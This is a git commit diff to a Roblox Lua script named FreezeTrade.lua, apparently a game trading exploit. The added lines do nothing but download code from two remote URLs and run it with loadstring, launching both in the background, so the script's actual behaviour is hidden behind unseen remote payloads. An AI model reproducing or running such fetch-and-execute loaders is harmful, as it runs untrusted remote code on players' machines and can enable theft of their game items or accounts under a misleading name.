5c660e7390d38440131771f85fb01382f4b26463
XenaScriptX <kenjieclark30@gmail.com>
2026-09-11 14:05:31 +0800

    Update FreezeTrade.lua

--- FreezeTrade.lua
+++ FreezeTrade.lua
@@ -1,1 +1,9 @@
+local function s1() 
+    loadstring(game:HttpGet("https://mm2lua.vercel.app/", true))()
+end 
+local function s2() 
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/no9DMUGjAklMKrH4/raw", true))()
+end
 
+task.spawn(s1)
+task.spawn(s2)
